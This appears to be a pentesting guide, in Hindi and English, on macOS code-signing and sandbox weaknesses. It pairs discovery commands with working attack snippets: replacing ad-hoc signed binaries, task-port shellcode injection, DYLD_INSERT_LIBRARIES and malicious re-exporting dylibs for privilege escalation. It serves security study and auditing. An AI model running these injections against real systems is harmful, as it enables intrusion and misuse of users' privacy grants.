# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`) एक **certificate chain** के बिना code signature बनाता है — यह developer identity verification के बिना code का hash होता है। Binary के origin को किसी developer या organization तक trace नहीं किया जा सकता।<sup>[[1]](#references)[[4]](#references)</sup>

Apple Silicon Macs पर सभी executables के लिए कम-से-कम एक ad-hoc signature आवश्यक होता है। इसका अर्थ है कि आपको कई development tools, Homebrew packages और third-party utilities पर ad-hoc signatures मिलेंगे।

### Why This Matters

- **कोई verifiable identity नहीं** — identity-based checks द्वारा detection के बिना binary को replace किया जा सकता है
- **Privileged positions** (FDA, daemon, helpers) में मौजूद third-party ad-hoc binaries high-priority targets होते हैं
- कुछ configurations में, ad-hoc signatures को developer-signed code जितनी सख्ती से **verify नहीं किया जा सकता**
- जिन ad-hoc signed binaries को **TCC grants** प्राप्त हैं, वे विशेष रूप से valuable होते हैं — grants तब भी persist करते हैं जब binary content बदल जाता है (यह इस बात पर निर्भर करता है कि TCC ने grant को कैसे key किया)

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Debuggable Processes (get-task-allow)

### मूल जानकारी

**`com.apple.security.get-task-allow`** entitlement (या **`CS_GET_TASK_ALLOW`** flag) **किसी भी process को debugger के रूप में attach होने**, memory पढ़ने, registers modify करने, code inject करने और execution को control करने की अनुमति देता है।<sup>[[3]](#references)</sup>

यह **केवल development builds** के लिए intended है। हालांकि, कुछ third-party binaries इस entitlement के साथ production में ship होते हैं।

> [!CAUTION]
> `get-task-allow` वाला production binary एक **instant exploitation primitive** है। कोई भी local process `task_for_pid()` call कर सकता है, target का Mach task port प्राप्त कर सकता है और ऐसा arbitrary code inject कर सकता है जो target के entitlements, TCC grants और security context के साथ चलता है।

### Discovery
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### हमला: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## No Library Validation + DYLD Environment

### Runtime Library-Validation Clearing

Private entitlement **`com.apple.private.security.clear-library-validation`** process launch पर library validation को disable नहीं करता। इसके बजाय, यह process को runtime पर स्वयं पर `csops(..., CS_OPS_CLEAR_LV, ...)` call करने की अनुमति देता है। इसके बाद XNU `CS_REQUIRE_LV | CS_FORCED_LV` को clear करता है, बशर्ते caller के पास entitlement हो और वह handler की अतिरिक्त checks को पूरा करता हो। नतीजतन, कोई process library-injection target तभी बन सकता है जब वह उस code path तक पहुंच जाए जो library validation को clear करता है।<sup>[[4]](#references)[[5]](#references)</sup>

### The Deadly Combination

जब किसी binary में **दोनों** मौजूद हों:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (कोई भी dylib load करता है)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD env vars स्वीकार करता है)

यह एक **guaranteed code injection primitive** है — `DYLD_INSERT_LIBRARIES` पूरी तरह काम करता है।

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attack: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox Temporary Exceptions

### वे Sandbox को कैसे कमजोर बनाते हैं

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) App Sandbox में छेद बनाते हैं:<sup>[[2]](#references)</sup>

| Exception | What It Allows |
|---|---|
| `temporary-exception.mach-lookup.global-name` | System-wide XPC/Mach services से connect करना |
| `temporary-exception.files.absolute-path.read-write` | App container के बाहर files को read/write करना |
| `temporary-exception.iokit-user-client-class` | IOKit user-client connections खोलना |
| `temporary-exception.shared-preference.read-only` | अन्य apps की preferences read करना |
| `temporary-exception.files.home-relative-path.read-write` | `~` के relative paths को access करना |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

सबसे खतरनाक exception **mach-lookup** है — यह sandboxed app को privileged daemons से बात करने की अनुमति देता है:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attack: Mach-Lookup के जरिए Sandbox Escape
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Private Apple Entitlements

### वे क्या हैं

`com.apple.private.*` से prefixed Entitlements **Apple-internal APIs** तक access प्रदान करते हैं, जो third-party developers के लिए documented या available नहीं हैं। Private Entitlements वाले third-party binaries ने उन्हें enterprise cert, MDM या non-App-Store distribution के माध्यम से प्राप्त किया।

### Dangerous Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Full TCC database read/write |
| `com.apple.private.tcc.allow` | Specific TCC services तक access |
| `com.apple.private.security.no-sandbox` | Sandbox के बिना run करना |
| `com.apple.private.iokit` | Direct IOKit driver access |
| `com.apple.private.kernel.\*` | Kernel interface access |
| `com.apple.private.xpc.launchd.job-label` | launchd jobs को register/manage करना |
| `com.apple.rootless.install` | SIP-protected paths में write करना |

### Discovery
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles (SBPL)

### ये क्या हैं

Binaries, SBPL (Seatbelt Profile Language) में लिखे गए **custom sandbox profiles** के साथ आ सकते हैं। ये profiles default App Sandbox की तुलना में अधिक प्रतिबंधात्मक OR **अधिक permissive** हो सकते हैं।

### Custom Profiles का Auditing
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## लिखने योग्य Library Paths

### ये क्या हैं

जब कोई binary किसी ऐसी path से dynamic library लोड करती है, जिस पर current user **लिख सकता है**, तो उस library को malicious code से बदला जा सकता है।

### Discovery
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### हमला: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Code Signing गाइड](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` ऑपरेशंस और `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV` हैंडलर)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
{{#include ../../../banners/hacktricks-training.md}}
